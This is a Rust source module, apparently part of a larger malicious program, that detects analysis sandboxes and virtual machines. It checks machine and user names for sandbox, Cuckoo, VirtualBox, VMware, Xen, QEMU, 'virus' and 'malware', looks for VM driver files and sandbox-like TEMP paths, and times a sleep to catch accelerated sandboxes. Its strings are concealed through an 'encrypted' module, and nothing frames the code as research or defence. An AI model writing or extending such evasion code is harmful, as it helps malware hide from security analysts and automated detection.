use std::time::Instant;
use crate::encrypted::*;

#[allow(dead_code)]
fn check_cpuid_hypervisor() -> bool {
    let result = unsafe { core::arch::x86_64::__cpuid(1) };
    result.ecx & (1 << 31) != 0
}

fn check_names() -> bool {
    if let Ok(name) = std::env::var(s_det_computername()) {
        let lower = name.to_lowercase();
        let targets = [
            s_det_sandbox(),
            s_det_cuckoo(),
            s_det_vbox(),
            s_det_vmware(),
            s_det_xen(),
            s_det_qemu(),
        ];
        if targets.iter().any(|b| lower.contains(b.as_str())) {
            return true;
        }
    }
    if let Ok(user) = std::env::var(s_det_username()) {
        let lower = user.to_lowercase();
        if lower == s_det_sandbox() || lower == s_det_virus() || lower == s_det_malware() || lower == s_det_currentuser() {
            return true;
        }
    }
    false
}

fn check_files() -> bool {
    let sys = std::env::var(s_det_windir()).unwrap_or_else(|_| s_det_windir_default());
    let drivers = std::path::PathBuf::from(&sys).join(s_det_system32_drivers());
    let checks = [
        s_det_vboxguest_sys(),
        s_det_vmhgfs_sys(),
        s_det_vboxsf_sys(),
        s_det_vboxvideo_sys(),
        s_det_vboxmouse_sys(),
        s_det_vboxguest_sys2(),
        s_det_vmci_sys(),
        s_det_vm3dmp_sys(),
    ];
    for name in &checks {
        if drivers.join(&name).exists() { return true; }
    }
    false
}

fn check_uptime() -> bool {
    if !crate::core::api::check_uptime() {
        return true;
    }
    false
}

fn check_resources() -> bool {
    if !crate::core::api::check_cpu_count() {
        return true;
    }
    if !crate::core::api::check_ram() {
        return true;
    }
    false
}

fn check_temp_path() -> bool {
    if let Ok(temp) = std::env::var(s_det_temp_env()) {
        let lower = temp.to_lowercase();
        if lower.contains(&s_det_temp_sandbox().to_lowercase()) || lower.contains(&s_det_temp_virus().to_lowercase()) || lower.contains(&s_det_temp_sample().to_lowercase()) {
            return true;
        }
    }
    false
}

pub fn verify_environment() -> bool {
    let start = Instant::now();
    std::thread::sleep(std::time::Duration::from_millis(500));
    if start.elapsed().as_millis() < 400 { crate::dbg_log!("[DETECT] uptime check failed"); return false; }
    if check_names() { crate::dbg_log!("[DETECT] names check failed"); return false; }
    if check_files() { crate::dbg_log!("[DETECT] files check failed"); return false; }
    if check_temp_path() { crate::dbg_log!("[DETECT] temp path check failed"); return false; }
    crate::dbg_log!("[DETECT] all checks passed");
    true
}
